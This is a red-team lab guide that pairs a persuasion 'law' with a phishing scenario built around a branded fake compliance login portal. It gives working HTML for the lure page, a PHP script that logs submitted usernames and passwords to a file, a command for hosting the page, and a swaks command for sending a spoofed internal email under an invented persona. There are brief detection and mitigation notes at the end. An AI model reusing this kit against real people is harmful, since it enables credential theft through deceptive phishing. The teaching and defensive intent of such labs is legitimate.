## **Law 37 — Create Compelling Spectacles**

Interpretation (offensive context):  
Humans trust what **looks polished and authoritative**. Visual quality (branding, layout, badges) reduces scrutiny. You convert a basic lure into a **high-conviction interface** that feels official.

---

# 🎯 Attack Scenario — _Branded Portal Deception (Visual Authority → Credential Capture)_

You present a **corporate-styled portal** (logo, layout, banners) so the user relies on visual cues instead of verification.

**Persona:**

> _Olga Petrovna_, 20 y/o Security Compliance Intern

---

# 🔴 Red Team Objective

- Increase:
    
    - **perceived legitimacy via visuals**
        
- Achieve:
    
    - credential capture with reduced suspicion
        
- Avoid:
    
    - “bare” pages that trigger doubt
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker/Host)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Visual Authority Design

Create a page that includes:

- header/banner
    
- logo placeholder
    
- formal title
    
- clean layout
    

On Kali:

```bash
mkdir spectacle && cd spectacle
```

```html
<!DOCTYPE html>
<html>
<head>
  <title>Security Compliance Portal</title>
  <style>
    body { font-family: Arial; background: #f2f2f2; }
    .box { width: 320px; margin: 80px auto; padding: 20px; background: white; border-radius: 8px; }
    h2 { margin-bottom: 10px; }
    input { width: 100%; margin: 6px 0; padding: 8px; }
    button { width: 100%; padding: 10px; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Security Compliance Check</h2>
    <p>Please sign in to continue.</p>
    <form action="cap.php" method="POST">
      <input name="user" placeholder="Email">
      <input type="password" name="pass" placeholder="Password">
      <button>Continue</button>
    </form>
  </div>
</body>
</html>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 2 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 3 — Delivery (Visual Hook)

```bash
swaks --to target@corp.local \
--from olga.p@corp.local \
--server 192.168.56.101 \
--data "Subject: Compliance portal

Hi,

Please complete the compliance check:

http://192.168.56.101:8080"
```

---

## Phase 4 — Execution

Target:

- sees structured, clean UI
    
- associates with official system
    
- submits credentials
    

👉 Visual trust overrides caution

---

# 🛠️ Tooling + Commands

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Delivery:

```bash
swaks --to target@corp.local --from olga.p@corp.local
```

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Visual persuasion**
    
- **Authority cues (design elements)**
    
- **Trust via familiarity of interface**
    

Key principle:

> People trust what looks official

---

# 🛡️ Detection & Defensive Insight

Indicators:

- login pages on:
    
    - raw IPs
        
    - non-official domains
        
- slight UI inconsistencies
    
- unexpected “compliance portals”
    

Mitigation:

- enforce:
    
    - access only via known domains
        
- train:
    
    - “Design ≠ legitimacy”
        
- browser protections:
    
    - flag unknown login pages
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Visual Authority and Interface Deception

### Include:

- portal UI screenshot
    
- email sample
    
- credential capture
    
- analysis:
    
    - how visuals influenced trust
        
- impact:
    
    - high-conversion phishing
        

---

# ⚠️ Operator Insight

Weak UI:

- raises suspicion
    

Strong UI:

- suppresses doubt
    

You’re not just delivering a link  
You’re delivering an **experience**

---

